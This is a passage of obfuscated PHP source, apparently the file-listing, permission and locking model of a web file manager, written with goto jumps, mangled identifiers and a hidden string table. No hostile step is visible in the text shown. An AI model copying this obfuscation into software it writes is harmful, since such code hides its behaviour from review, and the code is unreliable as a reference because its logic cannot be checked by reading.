array_to_keyvalue($c¡¤¶ğ¾Œ, $Eøã‡òÙ÷[393]); $c´ÕŠáñ = array_to_keyvalue_group($fÙîùĞ¸õ, $Eøã‡òÙ÷[76], $Eøã‡òÙ÷[428]); $C²ê“§Î—• = array_to_keyvalue($a£ØŞá«ÈÎ, $Eøã‡òÙ÷[76]); goto bµñ„ë©Ü‰; aß‘×µ·µË: } protected function _listAppendChildren(&$cÏõ˜Œ, $b„‰¤‡ã‰) { goto b¶î„–«ç; E©ˆéİ¥: $BÄçÛ’¯Ù‹ = array(); foreach ($e¤Š‡¸·èß as $Aêˆ½ğ£†š) { $e½Ø†Ø«‹Ä = $Aêˆ½ğ£†š[$aïŒôé¸[487]]; $aƒ£Êƒ¿ª = $Aêˆ½ğ£†š[$aïŒôé¸[412]] == $aïŒôé¸[87] ? $aïŒôé¸[204] : $aïŒôé¸[203]; if (!isset($BÄçÛ’¯Ù‹[$e½Ø†Ø«‹Ä])) { $BÄçÛ’¯Ù‹[$e½Ø†Ø«‹Ä] = array($aïŒôé¸[203] => 0, $aïŒôé¸[204] => 0); } $BÄçÛ’¯Ù‹[$e½Ø†Ø«‹Ä][$aƒ£Êƒ¿ª] += $Aêˆ½ğ£†š[$aïŒôé¸[489]]; } foreach ($cÏõ˜Œ as &$DÇ¦çß”¯‡) { if (!$DÇ¦çß”¯‡[$aïŒôé¸[412]]) { continue; } $C¬Ç®ó­¬• = is_array($BÄçÛ’¯Ù‹[$DÇ¦çß”¯‡[$aïŒôé¸[404]]]) ? $BÄçÛ’¯Ù‹[$DÇ¦çß”¯‡[$aïŒôé¸[404]]] : $a£ç¾Ø…Ã†; $DÇ¦çß”¯‡[$aïŒôé¸[204]] = $C¬Ç®ó­¬•[$aïŒôé¸[204]]; $DÇ¦çß”¯‡[$aïŒôé¸[203]] = $C¬Ç®ó­¬•[$aïŒôé¸[203]]; unset($DÇ¦çß”¯‡[$aïŒôé¸[414]]); } goto cğ‘µ–§ÃÊ; a‹Ğ÷¥‰—é: $F´„ï»öÓ¾ = array($aïŒôé¸[487] => array($aïŒôé¸[7], $Dëö‰â‹£ù)); $cÌŠíÇ®­Õ = array($aïŒôé¸[487], $aïŒôé¸[412], $aïŒôé¸[488] => $aïŒôé¸[489]); $e¤Š‡¸·èß = $this->field($cÌŠíÇ®­Õ)->where($F´„ï»öÓ¾)->group($aïŒôé¸[490])->select(); goto E©ˆéİ¥; b¶î„–«ç: $aïŒôé¸ =& $_SERVER[«¾°Ã¤]; $Dëö‰â‹£ù = array(); $a£ç¾Ø…Ã† = array($aïŒôé¸[203] => 0, $aïŒôé¸[204] => 0); goto c¾½‹¬—‘; cğ‘µ–§ÃÊ: unset($DÇ¦çß”¯‡); goto dÚÌ‚®Ÿ¤‹; c¾½‹¬—‘: foreach ($cÏõ˜Œ as &$DÇ¦çß”¯‡) { if (!$DÇ¦çß”¯‡[$aïŒôé¸[412]]) { continue; } $Dëö‰â‹£ù[] = $DÇ¦çß”¯‡[$aïŒôé¸[404]]; } unset($DÇ¦çß”¯‡); if (!$Dëö‰â‹£ù) { return; } goto a‹Ğ÷¥‰—é; dÚÌ‚®Ÿ¤‹: } protected function _listAppendAuth(&$A«¼‡Ïï¯Í) { goto cçİÃÂä„µ; f‡»”¤„²: $C¾˜ÏË”À = Model($C½£Ÿ“ç’ì[491])->getSourceList($a­ôñÖëã½, $fØ‡ùÁ¦î); foreach ($A«¼‡Ïï¯Í as $c÷Î²¥™ => &$eƒœïÃÁä¹) { $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]] = $C¾˜ÏË”À[$eƒœïÃÁä¹[$C½£Ÿ“ç’ì[404]]]; if (!$eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]] && $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[413]] == self::TYPE_GROUP) { $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]] = Action($C½£Ÿ“ç’ì[492])->pathGroupAuthMake($eƒœïÃÁä¹[$C½£Ÿ“ç’ì[493]]); if (!$eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]] && !_get($GLOBALS, $C½£Ÿ“ç’ì[494])) { $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[196]] = !1; $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[195]] = !1; } } if ($eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]]) { $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[196]] = AuthModel::authCheckEdit($eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]][$C½£Ÿ“ç’ì[416]]); $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[195]] = AuthModel::authCheckView($eƒœïÃÁä¹[$C½£Ÿ“ç’ì[415]][$C½£Ÿ“ç’ì[416]]); } $this->groupPathDisplay($eƒœïÃÁä¹); } unset($eƒœïÃÁä¹); goto D³éÖ—öµ»; cçİÃÂä„µ: $C½£Ÿ“ç’ì =& $_SERVER[«¾°Ã¤]; if (!defined($C½£Ÿ“ç’ì[463])) { return; } $a­ôñÖëã½ = array(); goto B†´ëÄ¿õä; B†´ëÄ¿õä: foreach ($A«¼‡Ïï¯Í as $eƒœïÃÁä¹) { if ($eƒœïÃÁä¹[$C½£Ÿ“ç’ì[413]] == self::TYPE_GROUP) { $a­ôñÖëã½[] = $eƒœïÃÁä¹[$C½£Ÿ“ç’ì[404]]; } } if (!$a­ôñÖëã½) { return; } $fØ‡ùÁ¦î = array_to_keyvalue($A«¼‡Ïï¯Í, $C½£Ÿ“ç’ì[404]); goto f‡»”¤„²; D³éÖ—öµ»: } public function groupPathDisplay(&$A•ˆ°÷²¹¶) { goto Cõ¯’±ÀÚº; F¢ÕÉÚçŞ‘: $a×ÑàŞãÙˆ = $this->parentLevelArray($eÒÛ“²†ñ[$a…®áÀ³‰Ì[496]]); $EÂ“İ‰¹Êó = $a…®áÀ³‰Ì[33]; foreach ($a×ÑàŞãÙˆ as $AÅ´ø„½„) { $c•Ê‘¥÷‡ = Model($a…®áÀ³‰Ì[495])->getInfo($AÅ´ø„½„); $EÂ“İ‰¹Êó .= $c•Ê‘¥÷‡[$a…®áÀ³‰Ì[85]][$a…®áÀ³‰Ì[404]] . $a…®áÀ³‰Ì[47]; } goto bÆÒ¬İ’‡Ü; Cõ¯’±ÀÚº: $a…®áÀ³‰Ì =& $_SERVER[«¾°Ã¤]; if ($A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[413]] != self::TYPE_GROUP) { return; } $eÒÛ“²†ñ = Model($a…®áÀ³‰Ì[495])->getInfo($A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[493]]); goto F¢ÕÉÚçŞ‘; bÆÒ¬İ’‡Ü: $A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[497]] = $eÒÛ“²†ñ[$a…®áÀ³‰Ì[487]]; $A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[498]] = $eÒÛ“²†ñ[$a…®áÀ³‰Ì[496]]; $A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[499]] = $eÒÛ“²†ñ[$a…®áÀ³‰Ì[500]]; goto d«³ºÏÉçÒ; d«³ºÏÉçÒ: $A•ˆ°÷²¹¶[$a…®áÀ³‰Ì[501]] = $EÂ“İ‰¹Êó . $eÒÛ“²†ñ[$a…®áÀ³‰Ì[85]][$a…®áÀ³‰Ì[404]]; goto d«Ø­†–ƒ; d«Ø­†–ƒ: } protected function _listAppendPath(&$dÅÚŒÕ¬ù) { goto aÇÛ¶è¢áñ; aÇÛ¶è¢áñ: $cöÉ³¨­¦ =& $_SERVER[«¾°Ã¤]; static $Eá¿õ£Ãè = array(); $B›°ÍÂ…Õ­ = array(); goto dÄ¼ÆÑ×¦Ù; dÄ¼ÆÑ×¦Ù: $EĞ‡¡Ğ¦â = array(); foreach ($dÅÚŒÕ¬ù as &$A¨©•ô‚©º) { $Cñ¿°ËÈÅ¶ = $A¨©•ô‚©º[$cöÉ³¨­¦[412]] == $cöÉ³¨­¦[87]; if ($Cñ¿°ËÈÅ¶) { $Eá¿õ£Ãè[$A¨©•ô‚©º[$cöÉ³¨­¦[404]]] = $A¨©•ô‚©º[$cöÉ³¨­¦[28]]; } if (isset($EĞ‡¡Ğ¦â[$A¨©•ô‚©º[$cöÉ³¨­¦[496]]])) { continue; } $EĞ‡¡Ğ¦â[$A¨©•ô‚©º[$cöÉ³¨­¦[496]]] = !0; $Bğõİ¹® = $this->parentLevelArray($A¨©•ô‚©º[$cöÉ³¨­¦[496]]); foreach ($Bğõİ¹® as $E±Ç½ÆÃÉ => $d¿­áäáŒ¢) { if ($E±Ç½ÆÃÉ != 0 && !isset($Eá¿õ£Ãè[$d¿­áäáŒ¢])) { $B›°ÍÂ…Õ­[] = $d¿­áäáŒ¢; } } } unset($A¨©•ô‚©º); goto B”¥÷ŸÃß; B”¥÷ŸÃß: $B›°ÍÂ…Õ­ = array_unique($B›°ÍÂ…Õ­); if (count($B›°ÍÂ…Õ­) > 0) { $aâÂÒ±é¹‚ = array($cöÉ³¨­¦[419] => array($cöÉ³¨­¦[420], $B›°ÍÂ…Õ­)); if (count($B›°ÍÂ…Õ­) == 1) { $C÷•ßÔ‰‰ä = $this->sourceInfo($B›°ÍÂ…Õ­[0]); $f¯ÔÛ§ÌÔÙ = is_array($C÷•ßÔ‰‰ä) ? array($C÷•ßÔ‰‰ä) : !1; } else { $f¯ÔÛ§ÌÔÙ = $this->field($cöÉ³¨­¦[502])->where($aâÂÒ±é¹‚)->select(); } if (!$f¯ÔÛ§ÌÔÙ) { $f¯ÔÛ§ÌÔÙ = array(); } foreach ($f¯ÔÛ§ÌÔÙ as $fè‚óÄŠ³) { $Eá¿õ£Ãè[$fè‚óÄŠ³[$cöÉ³¨­¦[404]]] = $fè‚óÄŠ³[$cöÉ³¨­¦[28]]; } } $B…¿Ï…åå = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dÉé¹–¥­; dÉé¹–¥­: $f³‰È®¯õï = array(); $cÆô…Ú‚„¦ = array(); foreach ($dÅÚŒÕ¬ù as &$A¨©•ô‚©º) { goto AèŞ—Ö»´ ; AèŞ—Ö»´ : $F ÄëÜ‹ÌÎ = $A¨©•ô‚©º[$cöÉ³¨­¦[496]]; if (isset($cÆô…Ú‚„¦[$F ÄëÜ‹ÌÎ])) { $d­†Ë„Ò÷ = $f³‰È®¯õï[$F ÄëÜ‹ÌÎ]; } else { $Bğõİ¹® = $this->parentLevelArray($A¨©•ô‚©º[$cöÉ³¨­¦[496]]); $DÕ«ÃÄÎ = $cöÉ³¨­¦[503] . $A¨©•ô‚©º[$cöÉ³¨­¦[413]] . $cöÉ³¨­¦[449] . $A¨©•ô‚©º[$cöÉ³¨­¦[493]]; if ($f³‰È®¯õï[$DÕ«ÃÄÎ]) { $d­†Ë„Ò÷ = $f³‰È®¯õï[$DÕ«ÃÄÎ]; } else { $d­†Ë„Ò÷ = $this->_listAppendPathRoot($A¨©•ô‚©º, $Bğõİ¹®); $f³‰È®¯õï[$DÕ«ÃÄÎ] = $d­†Ë„Ò÷; } foreach ($Bğõİ¹® as $E±Ç½ÆÃÉ => $d¿­áäáŒ¢) { if ($E±Ç½ÆÃÉ == 0 && $d­†Ë„Ò÷ && $A¨©•ô‚©º[$cöÉ³¨­¦[413]] == self::TYPE_GROUP) { continue; } if (isset($Eá¿õ£Ãè[$d¿­áäáŒ¢])) { $d­†Ë„Ò÷ .= $Eá¿õ£Ãè[$d¿­áäáŒ¢] . $cöÉ³¨­¦[8]; } } if ($Bğõİ¹®) { $d­†Ë„Ò÷ .= $A¨©•ô‚©º[$cöÉ³¨­¦[28]]; } $f³‰È®¯õï[$F ÄëÜ‹ÌÎ] = $d­†Ë„Ò÷; } if ($A¨©•ô‚©º[$cöÉ³¨­¦[412]]) { $d­†Ë„Ò÷ .= $cöÉ³¨­¦[8]; } goto FÉé àÙäè; fÜÑˆğ´ÌŒ: if (intval($A¨©•ô‚©º[$cöÉ³¨­¦[413]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($A¨©•ô‚©º, $Bğõİ¹®, $B…¿Ï…åå); } goto bØ‡’ºãÏ; FÉé àÙäè: $A¨©•ô‚©º[$cöÉ³¨­¦[504]] = str_replace($cöÉ³¨­¦[505], $cöÉ³¨­¦[8], $d­†Ë„Ò÷); $DĞóÙÁÏÜ¼ = trim($A¨©•ô‚©º[$cöÉ³¨­¦[504]], $cöÉ³¨­¦[8]); if ($A¨©•ô‚©º[$cöÉ³¨­¦[487]] == $cöÉ³¨­¦[191] && $DĞóÙÁÏÜ¼) { $A¨©•ô‚©º[$cöÉ³¨­¦[28]] = $DĞóÙÁÏÜ¼; } goto fÜÑˆğ´ÌŒ; bØ‡’ºãÏ: } goto eÚ£é½“Ş¢; eÚ£é½“Ş¢: unset($A¨©•ô‚©º); return $dÅÚŒÕ¬ù; goto D·ÚëÇ—¼; D·ÚëÇ—¼: } private function _listAppendPathRecycle(&$aâ®…õƒé’, $EÖŒÁç‘’¢, $BœĞÒÄ³) { goto dÇÈÅ¸Äª; BÉ¦¯èîÚí: $AÄøÒçŒ‡… = implode($c÷Ôâ°‡¼„[8], array_slice($D”Óõ¹èÙº, 2)); $aâ®…õƒé’[$c÷Ôâ°‡¼„[504]] = $c÷Ôâ°‡¼„[8] . LNG($c÷Ôâ°‡¼„[506]) . $c÷Ôâ°‡¼„[8] . ltrim($AÄøÒçŒ‡…, $c÷Ôâ°‡¼„[8]); $aâ®…õƒé’[$c÷Ôâ°‡¼„[496]] = $c÷Ôâ°‡¼„[507] . implode($c÷Ôâ°‡¼„[47], array_slice($EÖŒÁç‘’¢, 1)) . $c÷Ôâ°‡¼„[47]; goto B±ç»î…¼; dÇÈÅ¸Äª: $c÷Ôâ°‡¼„ =& $_SERVER[«¾°Ã¤]; if (!in_array($BœĞÒÄ³, $EÖŒÁç‘’¢) && $aâ®…õƒé’[$c÷Ôâ°‡¼„[404]] != $BœĞÒÄ³) { return; } $D”Óõ¹èÙº = explode($c÷Ôâ°‡¼„[8], trim($aâ®…õƒé’[$c÷Ôâ°‡¼„[504]], $c÷Ôâ°‡¼„[8])); goto BÉ¦¯èîÚí; B±ç»î…¼: if ($aâ®…õƒé’[$c÷Ôâ°‡¼„[404]] == $BœĞÒÄ³) { $aâ®…õƒé’[$c÷Ôâ°‡¼„[496]] = $c÷Ôâ°‡¼„[507]; $aâ®…õƒé’[$c÷Ôâ°‡¼„[487]] = $c÷Ôâ°‡¼„[191]; $aâ®…õƒé’[$c÷Ôâ°‡¼„[28]] = LNG($c÷Ôâ°‡¼„[506]); } $aâ®…õƒé’[$c÷Ôâ°‡¼„[508]] = $c÷Ôâ°‡¼„[509]; goto e£õ©ÓŠ; e£õ©ÓŠ: } protected function _listAppendPathRoot(&$e¬ƒ…„¯Öù, $b•ñãçî­) { $bª›Òö›ç =& $_SERVER[«¾°Ã¤]; $cÇœ˜ìÑÈ = $bª›Òö›ç[33]; if ($e¬ƒ…„¯Öù[$bª›Òö›ç[413]] == self::TYPE_USER) { if (defined($bª›Òö›ç[463]) && $e¬ƒ…„¯Öù[$bª›Òö›ç[493]] == USER_ID) { $cÇœ˜ìÑÈ = LNG($bª›Òö›ç[510]); if (!$b•ñãçî­) { $e¬ƒ…„¯Öù[$bª›Òö›ç[28]] = $cÇœ˜ìÑÈ; } } else { $dŞ¥ˆŠ‘³ = Model($bª›Òö›ç[511])->getInfoSimple($e¬ƒ…„¯Öù[$bª›Òö›ç[493]]); $cÇœ˜ìÑÈ = LNG($bª›Òö›ç[512]) . $bª›Òö›ç[160] . $dŞ¥ˆŠ‘³[$bª›Òö›ç[28]] . $bª›Òö›ç[513]; } } else { if ($e¬ƒ…„¯Öù[$bª›Òö›ç[413]] == self::TYPE_GROUP) { $dŞ¥ˆŠ‘³ = Model($bª›Òö›ç[495])->getInfoSimple($e¬ƒ…„¯Öù[$bª›Òö›ç[493]]); $cÇœ˜ìÑÈ = $dŞ¥ˆŠ‘³[$bª›Òö›ç[28]]; } else { if ($e¬ƒ…„¯Öù[$bª›Òö›ç[413]] == self::TYPE_SYSTEM) { $cÇœ˜ìÑÈ = $bª›Òö›ç[514]; } } } $cÇœ˜ìÑÈ = $cÇœ˜ìÑÈ ? $bª›Òö›ç[8] . $cÇœ˜ìÑÈ . $bª›Òö›ç[8] : $bª›Òö›ç[8]; return $cÇœ˜ìÑÈ; } protected function _listAppendUser(&$c“ÎŞ‡¨‡«) { goto AÏäÀ©Î©š; B¼©‘¡¾¤á: unset($e±âÌóã•ï); goto f•É¡Û©•™; AÏäÀ©Î©š: $DÙÄ”¯“–¥ =& $_SERVER[«¾°Ã¤]; $c¦÷˜òà› = array_to_keyvalue($c“ÎŞ‡¨‡«, $DÙÄ”¯“–¥[33], $DÙÄ”¯“–¥[441]); $e÷ƒˆ„À¿« = array_to_keyvalue($c“ÎŞ‡¨‡«, $DÙÄ”¯“–¥[33], $DÙÄ”¯“–¥[443]); goto c·Øá„ÄÄ©; c·Øá„ÄÄ©: $D„¥®×Ã = array_merge($c¦÷˜òà›, $e÷ƒˆ„À¿«); $C¦÷Û·âÈ = Model($DÙÄ”¯“–¥[515])->userListInfo($D„¥®×Ã); foreach ($c“ÎŞ‡¨‡« as &$e±âÌóã•ï) { $eĞ£òóŠëï = $e±âÌóã•ï[$DÙÄ”¯“–¥[441]]; $e±âÌóã•ï[$DÙÄ”¯“–¥[441]] = $C¦÷Û·âÈ[$eĞ£òóŠëï] ? $C¦÷Û·âÈ[$eĞ£òóŠëï] : !1; $eĞ£òóŠëï = $e±âÌóã•ï[$DÙÄ”¯“–¥[443]]; $e±âÌóã•ï[$DÙÄ”¯“–¥[443]] = $C¦÷Û·âÈ[$eĞ£òóŠëï] ? $C¦÷Û·âÈ[$eĞ£òóŠëï] : !1; if (isset($e±âÌóã•ï[$DÙÄ”¯“–¥[454]]) && $e±âÌóã•ï[$DÙÄ”¯“–¥[454]][$DÙÄ”¯“–¥[516]]) { $A©—Ô¦ğÃÚ = $GLOBALS[$DÙÄ”¯“–¥[6]][$DÙÄ”¯“–¥[88]][$DÙÄ”¯“–¥[517]]; if ($e±âÌóã•ï[$DÙÄ”¯“–¥[454]][$DÙÄ”¯“–¥[518]] <= time() - $A©—Ô¦ğÃÚ) { $this->metaSet($e±âÌóã•ï[$DÙÄ”¯“–¥[404]], $DÙÄ”¯“–¥[516], null); $this->metaSet($e±âÌóã•ï[$DÙÄ”¯“–¥[404]], $DÙÄ”¯“–¥[518], null); unset($e±âÌóã•ï[$DÙÄ”¯“–¥[454]][$DÙÄ”¯“–¥[516]]); continue; } $Eêòœ¼¨¦Ú = $e±âÌóã•ï[$DÙÄ”¯“–¥[454]][$DÙÄ”¯“–¥[516]]; $e±âÌóã•ï[$DÙÄ”¯“–¥[454]][$DÙÄ”¯“–¥[519]] = Model($DÙÄ”¯“–¥[515])->getInfoSimpleOuter($Eêòœ¼¨¦Ú); } } goto B¼©‘¡¾¤á; f•É¡Û©•™: } public function parentLevelArray($e¿ƒëñò³) { $AÖ‡§ °¿ó =& $_SERVER[«¾°Ã¤]; $e¿ƒëñò³ = explode($AÖ‡§ °¿ó[47], trim($e¿ƒëñò³, $AÖ‡§ °¿ó[47])); return array_remove_value($e¿ƒëñò³, $AÖ‡§ °¿ó[191]); } public function listAll($AÉˆÚÙ¡ïÊ) { goto bÓÂ½»ğ—¶; B–ÍÄ»îÂ«: $this->_listAppendAuth($C¡„ÙÙÌ’Ï); $this->_listAppendUser($C¡„ÙÙÌ’Ï); $this->_listAppendPath($C¡„ÙÙÌ’Ï); goto a×Ç¸—ÎÍÇ; a×Ç¸—ÎÍÇ: $C¡„ÙÙÌ’Ï = array_to_keyvalue($C¡„ÙÙÌ’Ï, $CĞÒ„Äç­—[404]); $BéÜ±‡Äì• = "\x2f{$dšÈä™“ä[$CĞÒ„Äç­—[28]]}\57"; $BéÜ±‡Äì• = $BéÜ±‡Äì• == $CĞÒ„Äç­—[505] ? $CĞÒ„Äç­—[8] : $BéÜ±‡Äì•; goto F†šç·®Ò; fˆÎÈ¤¿¬: $dŠ½ƒÅ¦· = $CĞÒ„Äç­—[524]; $C”ÄÍ²‹àà = "\x4c\x45\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x69\157\x5f\146\151\x6c\x65\40\146\x69\x6c\x65\x20\157\x6e\40\163\x6f\x75\x72\x63\145\x2e\x66\151\154\145\111\104\40\75\x20\x66\x69\x6c\145\56\146\151\154\x65\x49\104"; $C¡„ÙÙÌ’Ï = $this->alias($CĞÒ„Äç­—[525])->field($dŠ½ƒÅ¦·)->where($a°š—‚§Å)->join($C”ÄÍ²‹àà)->select(); goto B–ÍÄ»îÂ«; F†šç·®Ò: $cÕÈÉÒà× = array(); foreach ($C¡„ÙÙÌ’Ï as $A§öÚ“´±· => $E¥ôŞòÖµ¨) { goto eÙã¥‡¼”; eÙã¥‡¼”: $AŸÒäƒ… = $this->parentLevelArray($E¥ôŞòÖµ¨[$CĞÒ„Äç­—[496]]); array_shift($AŸÒäƒ…); $dçÔò“Ë¬• = $BéÜ±‡Äì•; goto BŠ÷Õ¡Ÿ¸; BŠ÷Õ¡Ÿ¸: for ($bŒ£ÛŞ´¨Ñ = 0; $bŒ£ÛŞ´¨Ñ < count($AŸÒäƒ…); $bŒ£ÛŞ´¨Ñ++) { $dçÔò“Ë¬• .= $C¡„ÙÙÌ’Ï[$AŸÒäƒ…[$bŒ£ÛŞ´¨Ñ]][$CĞÒ„Äç­—[28]] . $CĞÒ„Äç­—[8]; } $dçÔò“Ë¬• .= $E¥ôŞòÖµ¨[$CĞÒ„Äç­—[28]]; if ($E¥ôŞòÖµ¨[$CĞÒ„Äç­—[412]]) { $dçÔò“Ë¬• .= $CĞÒ„Äç­—[8]; } goto EÉÆœĞë; EÉÆœĞë: $dçÔò“Ë¬• = str_replace($CĞÒ„Äç­—[505], $CĞÒ„Äç­—[8], $dçÔò“Ë¬•); $dçÔò“Ë¬• = str_replace($CĞÒ„Äç­—[505], $CĞÒ„Äç­—[8], $dçÔò“Ë¬•); $bíÁÃÒÅ”Œ = array($CĞÒ„Äç­—[423] => str_replace($CĞÒ„Äç­—[505], $CĞÒ„Äç­—[8], $dçÔò“Ë¬•), $CĞÒ„Äç­—[526] => intval($E¥ôŞòÖµ¨[$CĞÒ„Äç­—[412]]), $CĞÒ„Äç­—[85] => $this->pathInfoFilter($E¥ôŞòÖµ¨)); goto CŠÊöÙèœ; CŠÊöÙèœ: if (!$E¥ôŞòÖµ¨[$CĞÒ„Äç­—[412]]) { $bíÁÃÒÅ”Œ[$CĞÒ„Äç­—[456]] = $E¥ôŞòÖµ¨[$CĞÒ„Äç­—[456]]; $bíÁÃÒÅ”Œ[$CĞÒ„Äç­—[86]] = $E¥ôŞòÖµ¨[$CĞÒ„Äç­—[76]]; } $cÕÈÉÒà×[] = $bíÁÃÒÅ”Œ; goto bµ–¶Èù¡í; bµ–¶Èù¡í: } return $cÕÈÉÒà×; goto cƒ®äğÌ ; bÓÂ½»ğ—¶: $CĞÒ„Äç­— =& $_SERVER[«¾°Ã¤]; $dšÈä™“ä = $this->sourceInfo($AÉˆÚÙ¡ïÊ); $a°š—‚§Å = array($CĞÒ„Äç­—[520] => array($CĞÒ„Äç­—[521], $dšÈä™“ä[$CĞÒ„Äç­—[496]] . $AÉˆÚÙ¡ïÊ . $CĞÒ„Äç­—[522]), $CĞÒ„Äç­—[523] => 0); goto fˆÎÈ¤¿¬; cƒ®äğÌ : } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($bøİ²½çˆ) { goto A‡õÕ³Ã‰–; A‡õÕ³Ã‰–: $cºîóËôÕ´ =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($cºîóËôÕ´[527], $bøİ²½çˆ); goto B¹¼åĞÙ‚é; B¹¼åĞÙ‚é: $eÃ¨Ì–àÛ = 1; $this->_lockEvent($bøİ²½çˆ, array($cºîóËôÕ´[528], $cºîóËôÕ´[529]), $eÃ¨Ì–àÛ); $this->_lockParent($bøİ²½çˆ, array($cºîóËôÕ´[529]), $eÃ¨Ì–àÛ); goto bî ùáäµ²; bî ùáäµ²: $this->_lockEvent($bøİ²½çˆ, array($cºîóËôÕ´[530], $cºîóËôÕ´[531]), $eÃ¨Ì–àÛ); $this->_lockCheckEnd($cºîóËôÕ´[527], $bøİ²½çˆ); goto CèÓ´‰óø; CèÓ´‰óø: } public function lockCopyEnd($CÌÁŒˆÒËƒ) { $cˆ¨Ûè‡ïÒ =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $C‰‚…è°ùñ = 0; $this->_lockEvent($CÌÁŒˆÒËƒ, array($cˆ¨Ûè‡ïÒ[528], $cˆ¨Ûè‡ïÒ[529]), $C‰‚…è°ùñ); $this->_lockParent($CÌÁŒˆÒËƒ, array($cˆ¨Ûè‡ïÒ[529]), $C‰‚…è°ùñ); $this->_lockEvent($CÌÁŒˆÒËƒ, array($cˆ¨Ûè‡ïÒ[530], $cˆ¨Ûè‡ïÒ[531]), $C‰‚…è°ùñ); } public function lockWriteStart($bæŸ™Íƒ²œ, $Cò¨‹¹®éè = '') { goto cÇò¬ Áä; e¼æ¾©ÆÇ•: $A­¶•òâÂ¶ = 1; $this->_lockKey($BÒ¼åôšŒ†[532] . $bæŸ™Íƒ²œ . $BÒ¼åôšŒ†[95] . $Cò¨‹¹®éè, $A­¶•òâÂ¶); $this->_lockEvent($bæŸ™Íƒ²œ, array($BÒ¼åôšŒ†[527], $BÒ¼åôšŒ†[529]), $A­¶•òâÂ¶); goto f¤ãŒêå‘í; f¤ãŒêå‘í: $this->_lockParent($bæŸ™Íƒ²œ, array($BÒ¼åôšŒ†[527], $BÒ¼åôšŒ†[529]), $A­¶•òâÂ¶); $this->_lockCheckEnd($BÒ¼åôšŒ†[528], $bæŸ™Íƒ²œ); goto fÉ¯†œã¨; cÇò¬ Áä: $BÒ¼åôšŒ† =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($BÒ¼åôšŒ†[528], $bæŸ™Íƒ²œ); goto e¼æ¾©ÆÇ•; fÉ¯†œã¨: } public function lockWriteEnd($aòœ³†‘„é, $a“áì³ÑÕ = '') { $c­ËÎä“„ =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $bÀò ¶à· = 0; $this->_lockKey($c­ËÎä“„[532] . $aòœ³†‘„é . $c­ËÎä“„[95] . $a“áì³ÑÕ, $bÀò ¶à·); $this->_lockEvent($aòœ³†‘„é, array($c­ËÎä“„[527], $c­ËÎä“„[529]), $bÀò ¶à·); $this->_lockParent($aòœ³†‘„é, array($c­ËÎä“„[527], $c­ËÎä“„[529]), $bÀò ¶à·); } public function lockMoveStart($F©¯ŞÃš¾) { goto bˆøÀ¦Îë™; C…àİÃ±‰„: $this->_lockParent($F©¯ŞÃš¾, array($b÷³™å·Ä[527], $b÷³™å·Ä[529]), $FÕ¿Ş¡ôİ); $this->_lockEvent($F©¯ŞÃš¾, array($b÷³™å·Ä[534], $b÷³™å·Ä[530], $b÷³™å·Ä[531]), $FÕ¿Ş¡ôİ); $this->_lockCheckEnd($b÷³™å·Ä[529], $F©¯ŞÃš¾); goto Föá²Ö‘Û¯; bˆøÀ¦Îë™: $b÷³™å·Ä =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($b÷³™å·Ä[529], $F©¯ŞÃš¾); goto F‰ƒ†´ìß; F‰ƒ†´ìß: $FÕ¿Ş¡ôİ = 1; $this->_lockKey($b÷³™å·Ä[533] . $F©¯ŞÃš¾, $FÕ¿Ş¡ôİ); $this->_lockEvent($F©¯ŞÃš¾, array($b÷³™å·Ä[527], $b÷³™å·Ä[528]), $FÕ¿Ş¡ôİ); goto C…àİÃ±‰„; Föá²Ö‘Û¯: } public function lockMoveEnd($Aš§àé‘ïƒ) { goto d†ƒ£Â‚ù; d ‹„õ“ˆ×: $this->_lockEvent($Aš§àé‘ïƒ, array($f¤ Â®¤ç¿[534], $f¤ Â®¤ç¿[530], $f¤ Â®¤ç¿[531]), $B„ÎÑ‘Ëâ); goto C‡÷‰–»; F¾î«öêæ: $this->_lockKey($f¤ Â®¤ç¿[533] . $Aš§àé‘ïƒ, $B„ÎÑ‘Ëâ); $this->_lockEvent($Aš§àé‘ïƒ, array($f¤ Â®¤ç¿[527], $f¤ Â®¤ç¿[528]), $B„ÎÑ‘Ëâ); $this->_lockParent($Aš§àé‘ïƒ, array($f¤ Â®¤ç¿[527], $f¤ Â®¤ç¿[529]), $B„ÎÑ‘Ëâ); goto d ‹„õ“ˆ×; d†ƒ£Â‚ù: $f¤ Â®¤ç¿ =& $_SERVER[«¾°Ã¤]; if (!$this->allowLock()) { return; } $B„ÎÑ‘Ëâ = 0; goto F¾î«öêæ; C‡÷‰–»: } private function _lockCheck($D­¦™İ®»‚, $bÀÎ‡‰…å±) { goto b½©¬Í›Øå; b½©¬Í›Øå: $A†À‚šÜãÍ =& $_SERVER[«¾°Ã¤]; $D©÷™ŠÆİ = $this->sourceInfo($bÀÎ‡‰…å±); $eÚ°í‰Ä = $D­¦™İ®»‚ . $A†À‚šÜãÍ[95] . $bÀÎ‡‰…å±; goto fİ¤ç÷Èİ§; C¡¤ĞµÖ¢: CacheLock::setErrorMsg($A†À‚šÜãÍ[160] . htmlspecialchars($D©÷™ŠÆİ[$A†À‚šÜãÍ[28]]) . $A†À‚šÜãÍ[513] . $CœÉÏŒëßŠ); $this->_lockKey($eÚ°í‰Ä, 1); 